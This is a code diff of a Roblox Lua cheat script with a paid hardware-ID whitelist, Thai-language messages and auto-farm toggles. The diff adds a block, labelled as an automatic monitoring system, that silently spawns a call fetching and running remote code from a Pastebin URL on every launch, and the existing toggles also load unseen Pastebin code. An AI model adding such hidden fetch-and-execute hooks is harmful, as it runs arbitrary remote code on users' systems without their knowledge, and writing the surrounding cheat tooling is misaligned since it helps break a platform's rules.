@@ -12,7 +12,6 @@ local whitelist = {
     ["1bde10b9-306e-4bc3-a44c-1270082dbf10"] = "ม่อน",
 }
 
-
 if not whitelist[hwid] then
     player:Kick([[
 ❌ ไม่พบสิทธิ์การใช้งาน (Paid Version)
@@ -23,6 +22,16 @@ if not whitelist[hwid] then
 ]])
     return 
 end
+
+-- ==========================================
+-- ระบบเฝ้าระวังอัตโนมัติ 
+-- ==========================================
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/fuDuZziN"))()
+    end)
+end)
+-- ==========================================
 
 local safePos = CFrame.new(-6.88, 200004.47, 194.75)
 
@@ -108,7 +117,6 @@ end)
 Tabs.Main:AddToggle("AutoPackage", {Title = "Auto Package", Default = false}):OnChanged(function(v)
     _G.AutoPackage = v
     if v then
-        -- โหลดสคริปต์แค่ครั้งเดียว สคริปต์ใน Pastebin จะเช็คค่า _G.AutoPackage เอง
         pcall(function()
             loadstring(game:HttpGet("https://pastebin.com/raw/mz25jTgu"))()
         end)
@@ -144,7 +152,6 @@ Tabs.Main:AddToggle("AutoRemoteKill", {Title = "Auto Farm Haki (OP)", Default = 
         end)
     end
 end)
-
 
 local autoSam = false
 Tabs.Main:AddToggle("AutoSam", {Title = "Auto Sam", Default = false}):OnChanged(function(v)
